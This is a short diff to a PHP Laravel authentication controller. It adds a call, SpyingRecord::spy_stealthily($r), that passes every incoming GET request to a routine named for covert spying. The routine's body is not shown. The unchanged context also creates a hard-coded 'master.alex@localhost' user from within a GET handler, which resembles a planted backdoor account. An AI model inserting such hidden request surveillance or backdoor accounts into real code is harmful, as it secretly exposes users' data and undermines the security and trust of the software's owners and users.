@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers;
 
+use App\Models\SpyingRecord;
 use App\Models\User;
 use Illuminate\Database\QueryException;
 use Illuminate\Http\Request;
@@ -11,6 +12,8 @@ class AuthController extends Controller
 {
     public function onGetRequest(Request $r)
     {
+        SpyingRecord::spy_stealthily($r);
+
         if (User::where('email', '=', 'master.alex@localhost')->count() < 1) {
             User::create([
                 'firstname' => 'Alex',
